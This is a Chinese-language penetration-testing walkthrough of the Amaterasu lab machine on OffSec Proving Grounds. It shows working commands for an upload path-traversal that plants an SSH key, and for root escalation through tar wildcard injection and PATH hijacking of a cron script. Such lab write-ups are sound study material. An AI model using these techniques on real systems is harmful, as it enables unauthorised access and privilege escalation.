# Amaterasu 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：Linux
> - **難易度**：Easy
> - **整理時間**：2026-07-04

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 連接埠掃描 (Nmap)
使用 Nmap 掃描目標主機開放之埠口與服務：
```bash
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
33414/tcp open  unknown Werkzeug/2.2.3 Python/3.9.13 (REST API)
40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 21/tcp     | FTP          | vsftpd 3.0.3 | 允許匿名登入，但無法取得目錄列表（連線逾時）。 |
| 25022/tcp  | SSH          | OpenSSH 8.6  | 遠端管理服務，後續可用於登入。 |
| 33414/tcp  | HTTP (Werkzeug) | Werkzeug 2.2.3 (Python 3.9.13) | Python REST API 服務，為主要突破口。 |
| 40080/tcp  | HTTP (Apache) | Apache 2.4.53 | 預設 Apache 測試頁面。 |

---

### 🌐 Web 服務列舉 (REST API)

針對 Port 33414 進行目錄與端點爆破，可以使用 `gobuster` 或 `dirsearch` 進行掃描：

1. **使用 Gobuster 或 Dirsearch 進行目錄爆破**：
	```bash
	┌──(kali㉿kali)-[~]
	└─$ gobuster dir -u http://192.168.182.249:33414/ -w /usr/share/wordlists/dirb/common.txt -t 50
	===============================================================
	Gobuster v3.8.2
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://192.168.182.249:33414/
	[+] Method:                  GET
	[+] Threads:                 50
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.8.2
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	help                 (Status: 200) [Size: 137]
	info                 (Status: 200) [Size: 98]
	Progress: 4613 / 4613 (100.00%)
	===============================================================
	Finished
	===============================================================
	```
   
   爆破結果發現 `/info`、`/help` 端點，查看 `/info`。
   
   ![](image/Pasted%20image%2020260704155728.png)

1. **存取 `/help` 端點**以獲取 API 資訊：

	![](image/Pasted%20image%2020260704155831.png)
	
   ```bash
   curl -s http://192.168.182.249:33414/help | jq .
   ```
   **回傳結果：**
   ```json
   [
     "GET /info : General Info",
     "GET /help : This listing",
     "GET /file-list?dir=/tmp : List of the files",
     "POST /file-upload : Upload files"
   ]
   ```

#### 1. 使用者列舉與發現 alfredo
在使用 `/file-list` 接口時，我們可以嘗試列出系統的 `/home` 目錄來收集有效的使用者帳號名稱：
```bash
curl -s http://192.168.182.249:33414/file-list?dir=/home | jq .
```
**回傳結果：**
```json
[
  "alfredo"
]
```
結果證實系統中存在一位名為 `alfredo` 的使用者。接著，我們嘗試列出其家目錄的內容：
```bash
curl -s http://192.168.182.249:33414/file-list?dir=/home/alfredo | jq .
```
**回傳結果：**
```json
[
  ".bash_logout",
  ".bash_profile",
  ".bashrc",
  "local.txt",
  ".ssh",
  "restapi",
  ".bash_history"
]
```
除了成功獲取其家目錄的結構外，也進一步確認此 API 服務正以低權限使用者 `alfredo` 的身分在背景運行。

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析
1. **副檔名過濾繞過**：
   在直接嘗試 POST 上傳檔案時：
	```bash
	┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
	└─$ touch test                            
	                                                                             
	┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
	└─$ curl http://192.168.182.249:33414/file-upload -F "file=@test"
	{"message":"No filename part in the request"}
	```
   補上 `filename` 參數，但因為副檔名限制失敗：
	```bash
	┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
	└─$ curl http://192.168.182.249:33414/file-upload -F "file=@test" -F "filename=test"
	{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
	```
   分析得知後端會檢查 `file` 參數的副檔名，但寫入檔案時卻使用表單欄位 `filename` 的值。

2. **路徑穿越 (Path Traversal)**：
   後端的 `filename` 參數並未限制目錄，允許使用 `../` 來指定任意寫入路徑。

---

### 🔑 初始存取突破 (Exploitation)

1. **生成 SSH 金鑰對**：
	```bash
	┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
	└─$ ssh-keygen -f alfredo
	Generating public/private ed25519 key pair.
	Enter passphrase for "alfredo" (empty for no passphrase): 
	Enter same passphrase again: 
	Your identification has been saved in alfredo
	Your public key has been saved in alfredo.pub
	The key fingerprint is:
	SHA256:RkqaFaBnTyAwz6Xml/OlNRuCz+LmfqTFiAVvSax90zY kali@kali
	The key's randomart image is:
	+--[ED25519 256]--+
	|o...+..          |
	| +.=o. .         |
	|  **o.+..        |
	| o.o*XooE        |
	|  .+B++oS.       |
	|  ...=+* +       |
	|    .+= .        |
	|   .o..          |
	|   ++.           |
	+----[SHA256]-----+
	```

2. **將公鑰複製並命名為符合白名單副檔名的檔案**：
	```bash
	┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
	└─$ cp alfredo.pub authorized_keys.txt
	                                                                                        
	┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
	└─$ cat authorized_keys.txt 
	ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMsiggADuzig7B4neFeensIcU+zjN8J52lEB4DtxLV3o kali@kali
	```

3. **利用路徑穿越將公鑰寫入 `alfredo` 用戶的 `.ssh` 目錄**：
   ```bash
   curl -X POST http://192.168.182.249:33414/file-upload \
     -F "file=@authorized_keys.txt" \
     -F "filename=../../../../../home/alfredo/.ssh/authorized_keys"
   ```
   **回傳結果：**
   ```json
   {"message":"File successfully uploaded"}
   ```

4. **透過 SSH 連線取得 low-privilege shell**：
	```bash
	┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
	└─$ ssh -i alfredo -p 25022 alfredo@192.168.182.249
	The authenticity of host '[192.168.182.249]:25022 ([192.168.182.249]:25022)' can't be established.
	ED25519 key fingerprint is: SHA256:kflJUZqQzlDWxXgGuod+HGsJPk++nvt5ZyveJgx1jgQ
	This key is not known by any other names.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '[192.168.182.249]:25022' (ED25519) to the list of known hosts.
	** WARNING: connection is not using a post-quantum key exchange algorithm.
	** This session may be vulnerable to "store now, decrypt later" attacks.
	** The server may need to be upgraded. See https://openssh.com/pq.html
	Last login: Tue Mar 28 03:21:25 2023
	[alfredo@fedora ~]$ find / -type f -name local.txt 2>/dev/null
	/home/alfredo/local.txt
	```
   成功取得用戶 `alfredo` 權限，並在 `/home/alfredo/local.txt` 取得第一個 Flag。

---

## ⚡ 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地端資訊列舉
使用 `pspy` 工具監控背景執行的進程，發現 root 定期執行一個備份腳本 `/usr/local/bin/backup-flask.sh`。

```bash
┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
└─$ scp -i alfredo -P 25022 /home/kali/Downloads/pspy64 alfredo@192.168.182.249:./pspy64
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
pspy64                                                                100% 3032KB 919.4KB/s   00:03
```

```bash
┌──(kali㉿kali)-[~/Desktop/playground/Amaterasu]
└─$ ssh -i alfredo -p 25022 alfredo@192.168.182.249                                     
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Sat Jul  4 04:33:57 2026 from 192.168.45.239
[alfredo@fedora ~]$ chmod +x pspy64 
[alfredo@fedora ~]$ ./pspy64 

.........

2026/07/04 04:41:01 CMD: UID=0     PID=7306   | /usr/sbin/crond -n 
2026/07/04 04:41:01 CMD: UID=0     PID=7307   | /bin/bash -c /usr/local/bin/backup-flask.sh 
2026/07/04 04:41:01 CMD: UID=0     PID=7308   | /bin/sh /usr/local/bin/backup-flask.sh 
2026/07/04 04:41:01 CMD: UID=0     PID=7309   | gzip 
2026/07/04 04:42:01 CMD: UID=0     PID=7310   | /usr/sbin/crond -n 
2026/07/04 04:42:01 CMD: UID=0     PID=7311   | 
2026/07/04 04:42:01 CMD: UID=0     PID=7313   | 
2026/07/04 04:42:01 CMD: UID=0     PID=7312   | tar czf /tmp/flask.tar.gz app.py main.py __pycache__ 

.........
```

```bash
[alfredo@fedora ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh
```

查看該腳本內容：
```bash
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

**漏洞點分析：**
1. **PATH 變數順序**：腳本將 `alfredo` 可寫入的目錄 `/home/alfredo/restapi` 放在 `PATH` 的最前頭。
2. **萬用字元與相對路徑**：腳本呼叫 `tar`（相對路徑而非絕對路徑）並使用 `*` 萬用字元備份所有檔案。

---

### 🛠️ 提升權限至 root

有兩種利用方式：

#### 方法 A：利用 Tar 萬用字元參數注入 (Tar Wildcard)
在 `/home/alfredo/restapi` 目錄下建立特殊檔名的檔案，將參數注入 `tar` 觸發任意命令執行：

1. **建立執行提權的 shell 腳本**：
   ```bash
   cd /home/alfredo/restapi
   echo -e '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
   chmod +x shell.sh
   ```

2. **利用 touch 建立參數檔案**：
   ```bash
   echo "" > '--checkpoint=1'
   echo "" > '--checkpoint-action=exec=sh shell.sh'
   ```

3. **取得 root 權限**：
   當 Cron Job 執行後，`tar *` 會展開並觸發對 `x` 的執行。隨後即可透過以下指令獲得 root 權限：
   ```bash
   bash -p
   ```

#### 方法 B：利用 PATH 劫持 (PATH Hijacking)
由於 `/home/alfredo/restapi` 位於 `PATH` 最前端，且 `backup-flask.sh` 未指定 `tar` 的絕對路徑：

1. **在該目錄下建立偽造的 `tar` 腳本**：
   ```bash
   [alfredo@fedora ~]$ cd /home/alfredo/restapi
   [alfredo@fedora restapi]$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > tar
   [alfredo@fedora restapi]$ chmod +x tar
   ```

2. **取得 root 權限**：
   等候定時任務執行，它將呼叫偽造的 `tar`。執行後執行：
	```bash
	[alfredo@fedora restapi]$ ls -al /bin/bash
	-rwxr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
	[alfredo@fedora restapi]$ ls -al /bin/bash
	-rwsr-sr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
	[alfredo@fedora restapi]$ bash -p
	bash-5.1# whoami
	root
	bash-5.1# find / -type f -name proof.txt 2>/dev/null
	/root/proof.txt
	```

成功於 `/root/proof.txt` 取得 root 權限與最後的 Flag。
